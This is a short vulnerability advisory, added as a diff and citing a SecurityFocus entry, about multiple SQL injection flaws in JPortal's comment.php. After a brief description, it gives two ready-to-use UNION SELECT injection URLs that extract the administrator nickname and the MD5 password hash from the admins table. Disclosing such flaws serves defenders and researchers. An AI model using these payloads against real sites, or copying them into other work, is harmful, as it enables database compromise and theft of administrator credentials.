@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/15324/info
+
+JPortal is prone to multiple SQL injection vulnerabilities. These are due to a lack of proper sanitization of user-supplied input before being used in an SQL query.
+
+Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation. 
+
+http://www.example.com/comment.php?what=news&id=<news id>
+and 1=0 union (select null, null, nick, null, null, null, null, null, null,
+null, null, null from admins limit n,1)
+got admin nick
+
+http://www.example.com/comment.php?what=news&id=<news id>
+and 1=0 union (select null, null, pass, null, null, null, null, null, null,
+null, null, null from admins limit n,1)
+got md5 password
